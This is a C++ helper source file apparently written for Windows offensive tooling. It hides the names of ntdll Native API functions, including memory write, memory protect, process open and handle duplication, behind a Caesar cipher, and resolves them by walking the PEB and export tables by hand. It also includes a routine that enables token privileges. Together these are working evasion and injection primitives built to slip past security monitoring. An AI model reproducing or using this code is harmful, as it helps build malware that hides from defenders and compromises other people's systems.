#include "helper.h"
#include <iostream>

using namespace std;

char ntdllName[] = "cisaa.saa";
char openTokenStr[] = "CiDetcEgdrthhIdztc";
char queryTokenStr[] = "CiFjtgnXcudgbpixdcIdztc";
char ntcloseStr[] = "CiRadht";
char adjustTokenStr[] = "CiPsyjhiEgxkxatvthIdztc";
char ntwriteStr[] = "CiLgxitKxgijpaBtbdgn";
char ntprotectStr[] = "CiEgditriKxgijpaBtbdgn";
char RTLinit[] = "GiaXcxiJcxrdstHigxcv";
char creatFile[] = "CiRgtpitUxat";
char Op3npr0[] = "CiDetcEgdrthh";
char ntAllocateVM[] = "CiPaadrpitKxgijpaBtbdgn";
char ntFreeVM[] = "CiUgttKxgijpaBtbdgn";
char NtQuerySystemInformationStr[] = "CiFjtgnHnhitbXcudgbpixdc";
char NtDuplicateObjectStr[] = "CiSjeaxrpitDqytri";
char NtQueryObjectStr[] = "CiFjtgnDqytri";

HMODULE ntdll = getNTDLL();

PNtClose NtClose = (PNtClose)hlpGetProcAddress(ntdll, caesarDecrypt(ntcloseStr,15));
PNtOpenProcessToken NtOpenProcessToken = (PNtOpenProcessToken)hlpGetProcAddress(ntdll, caesarDecrypt(openTokenStr, 15));
PNtQueryInformationToken NtQueryInformationToken = (PNtQueryInformationToken)hlpGetProcAddress(ntdll, caesarDecrypt(queryTokenStr, 15));
PNtAdjustPrivilegesToken NtAdjustPrivilegesToken = (PNtAdjustPrivilegesToken)hlpGetProcAddress(ntdll, caesarDecrypt(adjustTokenStr, 15));
myNtWriteVirtualMemory NtWriteVirtualMemory = (myNtWriteVirtualMemory)hlpGetProcAddress(ntdll, caesarDecrypt(ntwriteStr, 15));
myNtProtectVirtualMemory NtProtectVirtualMemory = (myNtProtectVirtualMemory)hlpGetProcAddress(ntdll, caesarDecrypt(ntprotectStr, 15));
_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)hlpGetProcAddress(ntdll, caesarDecrypt(RTLinit, 15));
myNtCreateFile ntCreateFile = (myNtCreateFile)hlpGetProcAddress(ntdll, caesarDecrypt(creatFile, 15));
myNtOpenProcess NtOpenProcess = (myNtOpenProcess)hlpGetProcAddress(ntdll, caesarDecrypt(Op3npr0, 15));
myNtAllocateVirtualMemory NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)hlpGetProcAddress(ntdll, caesarDecrypt(ntAllocateVM, 15));
PNtFreeVirtualMemory NtFreeVirtualMemory = (PNtFreeVirtualMemory)hlpGetProcAddress(ntdll, caesarDecrypt(ntFreeVM, 15));
PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)hlpGetProcAddress(ntdll, caesarDecrypt(NtQuerySystemInformationStr, 15));
PNtDuplicateObject NtDuplicateObject = (PNtDuplicateObject)hlpGetProcAddress(ntdll, caesarDecrypt(NtDuplicateObjectStr, 15));
PNtQueryObject NtQueryObject = (PNtQueryObject)hlpGetProcAddress(ntdll, caesarDecrypt(NtQueryObjectStr, 15));

HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {
	// get the offset of Process Environment Block
#ifdef _M_IX86
	PEB* ProcEnvBlk = (PEB*)__readfsdword(0x30);
#else
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
#endif
	// return base address of a calling module
	if (sModuleName == NULL)
		return (HMODULE)(ProcEnvBlk->ImageBaseAddress);
	PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr;
	LIST_ENTRY* ModuleList = NULL;
	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;
	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY* pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		// check if module is found and return its base address
		if (_wcsicmp(pEntry->BaseDllName.Buffer, sModuleName) == 0)
			return (HMODULE)pEntry->DllBase;
	}
	// otherwise:
	return NULL;
}

FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char* sProcName) {
	char* pBaseAddr = (char*)hMod;
	// get pointers to main headers/structures
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);
	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);
	// function address we're looking for
	void* pProcAddr = NULL;
	// resolve function by name
		// parse through table of function names
	for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
		char* sTmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];

		if (strcmp(sProcName, sTmpFuncName) == 0) {
			// found, get the function virtual address = RVA + BaseAddr
			pProcAddr = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
			break;
		}
	}
	return (FARPROC)pProcAddr;
}

LPCWSTR charToLPCWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}
LPWSTR charToLPWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];  // Adjust buffer size as needed
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}

HMODULE getNTDLL() {
	HMODULE ntdll = hlpGetModuleHandle(charToLPCWSTR(caesarDecrypt(ntdllName,15)));
	return ntdll;
}

BSTR ConvertCharToBSTR(const char* charArray)
{
	int length = MultiByteToWideChar(CP_ACP, 0, charArray, -1, NULL, 0);
	BSTR bstr = SysAllocStringLen(NULL, length - 1);
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, bstr, length);
	return bstr;
}

BOOL SetPrivilege(LPCWSTR privilege)
{
	// 64-bit only
	if (sizeof(LPVOID) != 8)
	{
		return FALSE;
	}

	// Initialize handle to process token
	HANDLE token = NULL;

	// Open our token
	if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token) != 0)
	{
		return FALSE;
	}

	// Token elevation struct
	TOKEN_ELEVATION tokenElevation = { 0 };
	DWORD tokenElevationSize = sizeof(TOKEN_ELEVATION);

	// Get token elevation status
	if (NtQueryInformationToken(token, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenElevationSize) != 0)
	{
		NtClose(token);
		return FALSE;
	}

	// Check if token is elevated
	if (!tokenElevation.TokenIsElevated)
	{
		NtClose(token);
		return FALSE;
	}

	// Lookup the LUID for the specified privilege
	LUID luid;
	if (!LookupPrivilegeValue(NULL, privilege, &luid))
	{
		NtClose(token);
		return FALSE;
	}

	// Size of token privilege struct
	DWORD tokenPrivsSize = 0;

	// Get size of current privilege array
	if (NtQueryInformationToken(token, TokenPrivileges, NULL, NULL, &tokenPrivsSize) != 0xC0000023)
	{
		NtClose(token);
		return FALSE;
	}

	// Allocate memory to store current token privileges
	PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)new BYTE[tokenPrivsSize];

	// Get current token privileges
	if (NtQueryInformationToken(token, TokenPrivileges, tokenPrivs, tokenPrivsSize, &tokenPrivsSize) != 0)
	{
		delete tokenPrivs;
		NtClose(token);
		return FALSE;
	}

	// Track whether or not token has the specified privilege
	BOOL status = FALSE;

	// Loop through privileges assigned to token to find the specified privilege
	for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
	{
		if (tokenPrivs->Privileges[i].Luid.LowPart == luid.LowPart &&
			tokenPrivs->Privileges[i].Luid.HighPart == luid.HighPart)
		{
			// Located the specified privilege, enable it if necessary
			if (!(tokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
			{
				tokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;

				// Apply updated privilege struct to token
				if (NtAdjustPrivilegesToken(token, FALSE, tokenPrivs, tokenPrivsSize, NULL, NULL) == 0)
				{
					status = TRUE;
				}
			}
			else
			{
				status = TRUE;
			}
			break;
		}
	}

	// Free token privileges buffer
	delete tokenPrivs;

	// Close token handle
	NtClose(token);

	return status;
}

LPSTR charToLPSTR(const char* str) {
	// 如果输入为空指针，返回空指针
	if (str == nullptr) {
		return nullptr;
	}

	// 获取字符串长度（不包括 null 终止符）
	size_t len = strlen(str);

	// 分配内存来存储转换后的字符串（包括 null 终止符）
	LPSTR lpstr = (LPSTR)LocalAlloc(LPTR, len + 1);

	// 如果内存分配成功，将输入字符串复制到 LPSTR 中
	if (lpstr != nullptr) {
		strcpy_s(lpstr, len + 1, str);
	}

	return lpstr;
}
std::string WStringToString(const std::wstring& wstr) {
	// 获取转换后需要的缓冲区大小
	int bufferSize = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);

	if (bufferSize == 0) {
		return "";
	}

	// 分配缓冲区
	std::string str(bufferSize, 0);

	// 执行转换
	WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, &str[0], bufferSize, nullptr, nullptr);

	// 去掉末尾的空字符
	str.resize(bufferSize - 1);

	return str;
}


char* caesarEncrypt(const char text[], int shift) {
	int len = std::strlen(text); 
	char* encrypted = new char[len + 1];  
	std::strcpy(encrypted, text);  

	for (int i = 0; i < len; ++i) {
		char ch = encrypted[i];
		if (isalpha(ch)) {  
			char offset = isupper(ch) ? 'A' : 'a';
			encrypted[i] = (ch - offset + shift) % 26 + offset;
		}
	}

	return encrypted;  
}

// 凯撒解密函数，返回新字符串
char* caesarDecrypt(const char text[], int shift) {
	return caesarEncrypt(text, 26 - (shift % 26));
}